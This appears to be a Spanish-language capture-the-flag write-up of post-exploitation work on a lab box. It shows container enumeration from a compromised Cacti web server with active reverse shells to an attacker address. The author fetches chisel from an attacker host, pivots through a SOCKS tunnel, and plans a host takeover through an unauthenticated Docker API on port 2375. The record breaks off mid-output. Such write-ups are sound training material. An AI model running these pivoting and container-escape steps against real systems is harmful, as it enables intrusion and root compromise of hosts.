www-data@821fbd6a43fa:~/html/cacti$ cat /proc/1/cgroup
cat /proc/1/cgroup
0::/

www-data@821fbd6a43fa:~/html/cacti$ cat /proc/self/cgroup
cat /proc/self/cgroup
0::/

www-data@821fbd6a43fa:~/html/cacti$ ls -la /.dockerenv 2>/dev/null
ls -la /.dockerenv 2>/dev/null
-rwxr-xr-x 1 root root 0 Nov 10 17:04 /.dockerenv

www-data@821fbd6a43fa:~/html/cacti$ grep -E 'Cap(Prm|Eff|Bnd|Inh)|NoNewPrivs' /proc/self/status
<'Cap(Prm|Eff|Bnd|Inh)|NoNewPrivs' /proc/self/status
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
NoNewPrivs:     0

www-data@821fbd6a43fa:~/html/cacti$ command -v capsh >/dev/null && capsh --print
<cacti$ command -v capsh >/dev/null && capsh --print
Current: =
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
Securebits: 00/0x0/1'b0 (no-new-privs=0)
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=33(www-data) euid=33(www-data)
gid=33(www-data)
groups=33(www-data)
Guessed mode: HYBRID (4)
www-data@821fbd6a43fa:~/html/cacti$ ls -la /dev | head
ls -la /dev | head
total 4
drwxr-xr-x 5 root root  340 Dec 13 03:56 .
drwxr-xr-x 1 root root 4096 Dec 13 03:58 ..
lrwxrwxrwx 1 root root   11 Dec 13 03:56 core -> /proc/kcore
lrwxrwxrwx 1 root root   13 Dec 13 03:56 fd -> /proc/self/fd
crw-rw-rw- 1 root root 1, 7 Dec 13 03:56 full
drwxrwxrwt 2 root root   40 Dec 13 03:56 mqueue
crw-rw-rw- 1 root root 1, 3 Dec 13 03:56 null
lrwxrwxrwx 1 root root    8 Dec 13 03:56 ptmx -> pts/ptmx
drwxr-xr-x 2 root root    0 Dec 13 03:56 pts
www-data@821fbd6a43fa:~/html/cacti$ mount | egrep -i 'docker.sock|containerd.sock|kube|hostPath|/var/run|/run|/proc|/sys'
<ainerd.sock|kube|hostPath|/var/run|/run|/proc|/sys'
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/interrupts type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/latency_stats type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)

www-data@821fbd6a43fa:~/html/cacti$ ls -la /var/run /run 2>/dev/null | head
ls -la /var/run /run 2>/dev/null | head
lrwxrwxrwx 1 root root    4 Nov  3 20:44 /var/run -> /run

/run:
total 16
drwxr-xr-x 1 root root 4096 Nov 10 17:05 .
drwxr-xr-x 1 root root 4096 Dec 13 03:58 ..
drwxrwxrwt 2 root root 4096 Nov  3 20:44 lock
-rw-r--r-- 1 root root    3 Dec 13 03:56 nginx.pid

www-data@821fbd6a43fa:~/html/cacti$ findmnt -R / 2>/dev/null | head -n 50
findmnt -R / 2>/dev/null | head -n 50
TARGET                  SOURCE                                                                                                         FSTYPE  OPTIONS
/                       overlay                                                                                                        overlay rw,relatime,lowerdir=/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/367/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/364/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/363/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/362/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/361/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/360/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/359/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/358/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/331/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/330/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/196/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/195/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/194/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/193/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/192/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/191/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/190/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/189/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/188/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/187/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/186/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/185/fs,upperdir=/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/368/fs,workdir=/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/368/work
|-/proc                 proc                                                                                                           proc    rw,nosuid,nodev,noexec,relatime
| |-/proc/bus           proc[/bus]                                                                                                     proc    ro,nosuid,nodev,noexec,relatime
| |-/proc/fs            proc[/fs]                                                                                                      proc    ro,nosuid,nodev,noexec,relatime
| |-/proc/irq           proc[/irq]                                                                                                     proc    ro,nosuid,nodev,noexec,relatime
| |-/proc/sys           proc[/sys]                                                                                                     proc    ro,nosuid,nodev,noexec,relatime
| |-/proc/sysrq-trigger proc[/sysrq-trigger]                                                                                           proc    ro,nosuid,nodev,noexec,relatime
| |-/proc/acpi          tmpfs                                                                                                          tmpfs   ro,relatime
| |-/proc/interrupts    tmpfs[/null]                                                                                                   tmpfs   rw,nosuid,size=65536k,mode=755
| |-/proc/kcore         tmpfs[/null]                                                                                                   tmpfs   rw,nosuid,size=65536k,mode=755
| |-/proc/keys          tmpfs[/null]                                                                                                   tmpfs   rw,nosuid,size=65536k,mode=755
| |-/proc/latency_stats tmpfs[/null]                                                                                                   tmpfs   rw,nosuid,size=65536k,mode=755
| |-/proc/timer_list    tmpfs[/null]                                                                                                   tmpfs   rw,nosuid,size=65536k,mode=755
| `-/proc/scsi          tmpfs                                                                                                          tmpfs   ro,relatime
|-/dev                  tmpfs                                                                                                          tmpfs   rw,nosuid,size=65536k,mode=755
| |-/dev/pts            devpts                                                                                                         devpts  rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666
| |-/dev/mqueue         mqueue                                                                                                         mqueue  rw,nosuid,nodev,noexec,relatime
| `-/dev/shm            shm                                                                                                            tmpfs   rw,nosuid,nodev,noexec,relatime,size=65536k
|-/sys                  sysfs                                                                                                          sysfs   ro,nosuid,nodev,noexec,relatime
| |-/sys/firmware       tmpfs                                                                                                          tmpfs   ro,relatime
| `-/sys/fs/cgroup      cgroup                                                                                                         cgroup2 ro,nosuid,nodev,noexec,relatime
|-/etc/resolv.conf      /dev/sde[/data/docker/containers/821fbd6a43fa182c5c884990fe74c22a80c1ec36db6adee758fdfa69bd4675b1/resolv.conf] ext4    rw,relatime
|-/etc/hostname         /dev/sde[/data/docker/containers/821fbd6a43fa182c5c884990fe74c22a80c1ec36db6adee758fdfa69bd4675b1/hostname]    ext4    rw,relatime
`-/etc/hosts            /dev/sde[/data/docker/containers/821fbd6a43fa182c5c884990fe74c22a80c1ec36db6adee758fdfa69bd4675b1/hosts]       ext4    rw,relatime

www-data@821fbd6a43fa:~/html/cacti$ cat /proc/1/cgroup
cat /proc/1/cgroup
0::/

www-data@821fbd6a43fa:~/html/cacti$ grep -E 'Cap(Prm|Eff|Bnd)|NoNewPrivs' /proc/self/status
< -E 'Cap(Prm|Eff|Bnd)|NoNewPrivs' /proc/self/status
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
NoNewPrivs:     0

www-data@821fbd6a43fa:~/html/cacti$ ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null; mount | head -n 30
<erd/containerd.sock 2>/dev/null; mount | head -n 30
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/367/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/364/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/363/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/362/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/361/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/360/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/359/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/358/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/331/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/330/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/196/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/195/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/194/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/193/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/192/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/191/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/190/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/189/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/188/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/187/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/186/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/185/fs,upperdir=/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/368/fs,workdir=/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/368/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/sde on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sde on /etc/hostname type ext4 (rw,relatime)
/dev/sde on /etc/hosts type ext4 (rw,relatime)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/interrupts type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/latency_stats type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)

www-data@821fbd6a43fa:~/html/cacti$ grep -E 'Seccomp|Seccomp_filters' /proc/self/status
<grep -E 'Seccomp|Seccomp_filters' /proc/self/status
Seccomp:        2
Seccomp_filters:        2

www-data@821fbd6a43fa:~/html/cacti$ cat /proc/1/status | grep -E 'Seccomp|NoNewPrivs' || true
<roc/1/status | grep -E 'Seccomp|NoNewPrivs' || true
NoNewPrivs:     0
Seccomp:        2
Seccomp_filters:        2

www-data@821fbd6a43fa:~/html/cacti$ ls -l /proc/self/ns
ls -l /proc/self/ns
total 0
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 cgroup -> cgroup:[4026532477]
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 ipc -> ipc:[4026532475]
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 mnt -> mnt:[4026532473]
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 net -> net:[4026532478]
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 pid -> pid:[4026532476]
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 pid_for_children -> pid:[4026532476]
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 time -> time:[4026531834]
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 time_for_children -> time:[4026531834]
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 user -> user:[4026531837]
lrwxrwxrwx 1 www-data www-data 0 Dec 13 04:11 uts -> uts:[4026532474]

www-data@821fbd6a43fa:~/html/cacti$ cat /proc/self/uid_map 2>/dev/null
cat /proc/self/uid_map 2>/dev/null
         0          0 4294967295

www-data@821fbd6a43fa:~/html/cacti$ cat /proc/self/gid_map 2>/dev/null
cat /proc/self/gid_map 2>/dev/null
         0          0 4294967295

www-data@821fbd6a43fa:~/html/cacti$ find / -xdev -perm -4000 -o -perm -2000 2>/dev/null | head -n 50
<-perm -4000 -o -perm -2000 2>/dev/null | head -n 50
/var/mail
/usr/sbin/unix_chkpwd
/usr/bin/su
/usr/bin/chage
/usr/bin/mount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/expiry
/usr/bin/chfn
/usr/bin/newgrp

www-data@821fbd6a43fa:~/html/cacti$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo 
       valid_lft forever preferred_lft forever
2: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 82:bf:f8:6e:49:d6 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever

www-data@821fbd6a43fa:~/html/cacti$ ls /sys/class/net
ls /sys/class/net
eth0
lo
www-data@821fbd6a43fa:~/html/cacti$ ip route
ip route
default via 172.18.0.1 dev eth0 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.3 

www-data@821fbd6a43fa:~/html/cacti$ cat /etc/resolv.conf 
cat /etc/resolv.conf
# Generated by Docker Engine.
# This file can be edited; Docker Engine will not make further changes once it
# has been modified.

nameserver 127.0.0.11
options ndots:0

# Based on host file: '/etc/resolv.conf' (internal resolver)
# ExtServers: [host(192.168.65.7)]
# Overrides: []
# Option ndots from: internal

www-data@821fbd6a43fa:~/html/cacti$ ss -tunap 2>/dev/null
ss -tunap 2>/dev/null
Netid State     Recv-Q Send-Q      Local Address:Port        Peer Address:Port Process                                                                                                                               
udp   UNCONN    0      0              127.0.0.11:55727            0.0.0.0:*                                                                                                                                          
tcp   LISTEN    0      4096           127.0.0.11:36109            0.0.0.0:*                                                                                                                                          
tcp   LISTEN    0      511               0.0.0.0:80               0.0.0.0:*     users:(("nginx",pid=12,fd=9),("nginx",pid=11,fd=9))                                                                                  
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:45500 users:(("nginx",pid=11,fd=16))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48136 users:(("nginx",pid=12,fd=48))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48106 users:(("nginx",pid=12,fd=44))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:50224 users:(("nginx",pid=11,fd=19))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:53700 users:(("nginx",pid=11,fd=17))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48120 users:(("nginx",pid=12,fd=45))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48084 users:(("nginx",pid=12,fd=41))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48122 users:(("nginx",pid=12,fd=46))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:40722        10.10.16.20:4444  users:(("ss",pid=174,fd=1),("ss",pid=174,fd=cat /proc/net/fib_trie | grep -A5 eth0
0),("bash",pid=47,fd=255),("bash",pid=47,fd=2),("bash",pid=47,fd=1),("bash",pid=47,fd=0))
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48146 users:(("nginx",pid=12,fd=49))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48094 users:(("nginx",pid=12,fd=43))                                                                                                       
tcp   TIME-WAIT 0      0              172.18.0.3:50510         172.18.0.2:3306                                                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48124 users:(("nginx",pid=12,fd=47))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:53696 users:(("nginx",pid=11,fd=15))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:46904        10.10.16.20:4444  users:(("bash",pid=76,fd=2),("bash",pid=76,fd=1),("bash",pid=76,fd=0))                                                               
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48072 users:(("nginx",pid=12,fd=40))                                                                                                       
tcp   TIME-WAIT 0      0              172.18.0.3:32958         172.18.0.2:3306                                                                                                                                       
tcp   TIME-WAIT 0      0              172.18.0.3:32950         172.18.0.2:3306                                                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:50220 users:(("nginx",pid=11,fd=18))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:53692 users:(("nginx",pid=11,fd=14))                                                                                                       
tcp   ESTAB     0      0              172.18.0.3:80            172.18.0.1:48092 users:(("nginx",pid=12,fd=42))                                                                                                       
tcp   LISTEN    0      4096                    *:9000                   *:*                                                                                                                                          
tcp   TIME-WAIT 0      0      [::ffff:127.0.0.1]:9000  [::ffff:127.0.0.1]:33398                                                                                                                                      
tcp   TIME-WAIT 0      0      [::ffff:127.0.0.1]:9000  [::ffff:127.0.0.1]:51826                                                                                                                                      
tcp   TIME-WAIT 0      0      [::ffff:127.0.0.1]:9000  [::ffff:127.0.0.1]:59240                                                                                                                                      
tcp   TIME-WAIT 0      0      [::ffff:127.0.0.1]:9000  [::ffff:127.0.0.1]:38606                                                                                                                                      
tcp   TIME-WAIT 0      0      [::ffff:127.0.0.1]:9000  [::ffff:127.0.0.1]:59204                                                                                                                                      
tcp   TIME-WAIT 0      0      [::ffff:127.0.0.1]:9000  [::ffff:127.0.0.1]:59322                                                                                                                                      
tcp   TIME-WAIT 0      0      [::ffff:127.0.0.1]:9000  [::ffff:127.0.0.1]:38906                                                                                                                                      
tcp   TIME-WAIT 0      0      [::ffff:127.0.0.1]:9000  [::ffff:127.0.0.1]:38980                                                                                                                                      
tcp   TIME-WAIT 0      0      [::ffff:127.0.0.1]:9000  [::ffff:127.0.0.1]:38888                                                                                                                                    
                                                                                                                                     
www-data@821fbd6a43fa:~/html/cacti$ ip -4 addr show eth0
ip -4 addr show eth0
2: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default  link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Levantamos porforwarding para pivot:

Subimos chisel con curl:

```bash
www-data@821fbd6a43fa:~/html/cacti$ curl -fLO http://10.10.15.90:8000/chisel   
curl -fLO http://10.10.15.90:8000/chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8452k  100 8452k    0     0  2327k      0  0:00:03  0:00:03 --:--:-- 2327k
www-data@821fbd6a43fa:~/html/cacti$ file chisel
file chisel
chisel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=Vj2dZtwAoQAnWw0Bx2Z6/LLhyF0FZOF_WFQmGQ15T/FZVs4pG8bg5V4LUlZY9Y/lqbm78RzOj-QEFoHZKsQ, stripped
```

* chisel server
```bash
┌──(kali㉿kali)-[~/tools/chisel]
└─$ chisel server -p 8000 --reverse
2025/12/13 16:18:30 server: Reverse tunnelling enabled
2025/12/13 16:18:30 server: Fingerprint wlgMLdWXVv4APVhW9iILD4ITp/MnRZfbrY9846XObTM=
2025/12/13 16:18:30 server: Listening on http://0.0.0.0:8000
2025/12/13 16:20:04 server: session#1: Client version (1.9.1) differs from server version (1.10.1-0kali1)
2025/12/13 16:20:04 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

* chisel client

```bash
www-data@821fbd6a43fa:~/html/cacti$ mv chisel-oKLVrYTB chisel
mv chisel-oKLVrYTB chisel
www-data@821fbd6a43fa:~/html/cacti$ chmod +x chisel
chmod +x chisel
www-data@821fbd6a43fa:~/html/cacti$ ./chisel client 10.10.17.163:8000 R:socks
./chisel client 10.10.17.163:8000 R:socks
2025/12/13 19:20:00 client: Connecting to ws://10.10.17.163:8000
2025/12/13 19:20:03 client: Connected (Latency 206.151308ms)
```

Ejecutamos nmap sobre el host que aloja los conenedores

```bash
┌──(venv-cactiPoc)─(root💀kali)-[/home/kali/HTB/MonitorFour/CVE-2025-24367-Cacti-PoC]
└─# proxychains nmap -A -sT -Pn -p 2375 192.168.65.7
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 16:29 -03
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
```
[Puerto 2375 = Docker Remote API sin TLS](https://scanitex.com/en/resources/ports/tcp/2375)

Si 2375 está accesible desde el contenedor y desde nuestra máquina vía SOCKS, entonces:

1. Podemos listar contenedores del host

2. Crear contenedores nuevos

3. Montar / del host dentro de un contenedor

4. Ejecutar comandos como root en el host

Todo esto sin explotar kernel, solo usando la API.

Procedemos a crear un contenedor malicioso, montar dentro el sistem host y ejecutar comandos como usuario root:

```bash
┌──(root💀kali)-[/home/kali/tools/chisel]
└─# proxychains curl http://192.168.65.7:2375/version
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
```

```bash                                                                                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/tools/chisel]
└─# proxychains curl http://192.168.65.7:2375/containers/json
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[{"Id":"821fbd6a43fa182c5c884990fe74c22a80c1ec36db6adee758fdfa69bd4675b1","Names":["/web"],"Image":"docker_setup-nginx-php","ImageID":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","ImageManifestDescriptor":{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"sha256:ff7427b740fa0fbb79ed506e028edfed7263ffc3a0c666510c86706ad3690350","size":4281,"platform":{"architecture":"amd64","os":"linux"}},"Command":"docker-php-entrypoint /start.sh","Created":1762794284,"Ports":[{"IP":"0.0.0.0","PrivatePort":80,"PublicPort":80,"Type":"tcp"},{"PrivatePort":9000,"Type":"tcp"}],"Labels":{"com.docker.compose.config-hash":"54a0d318f0f4ed9d35902f0c007a2bff60c5689a1c94f8ef7a94db7798386afd","com.docker.compose.container-number":"1","com.docker.compose.depends_on":"mariadb:service_healthy:false","com.docker.compose.image":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker_setup","com.docker.compose.project.config_files":"C:\\Users\\Administrator\\Documents\\docker_setup\\docker-compose.yml","com.docker.compose.project.working_dir":"C:\\Users\\Administrator\\Documents\\docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1","desktop.docker.io/ports.scheme":"v2","desktop.docker.io/ports/80/tcp":":80"},"State":"running","Status":"Up 11 